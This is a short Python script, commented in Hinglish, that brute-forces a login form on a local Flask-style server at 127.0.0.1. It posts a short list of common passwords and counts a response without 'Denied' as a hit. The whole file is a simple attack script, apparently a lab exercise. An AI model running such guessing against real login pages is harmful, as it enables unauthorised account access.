import requests

# URL wahi rakhna jo tera browser mein chalta hai
url = "http://127.0.0.1:5000/login"

# Password list
passwords = ["12345", "admin", "password", "Car@2026!", "123"]

def brute_force():
    for pwd in passwords:
        print(f"Trying password: {pwd}")
        
        # Form data send kar rahe hain
        response = requests.post(url, data={'password': pwd})
        
        # Agar status code 200 hai aur page access mil gaya hai
        # Hum check kar rahe hain ki kya server ne hamein 200 status diya hai
        if response.status_code == 200:
            # Agar response mein "Denied" nahi hai, toh hum andar ghus gaye!
            if "Denied" not in response.text:
                print(f"!!! SUCCESS !!! Password mil gaya: {pwd}")
                break
            else:
                print("Failed... (Access Denied)")
        else:
            print(f"Failed... (Server Error: {response.status_code})")

if __name__ == "__main__":
    brute_force()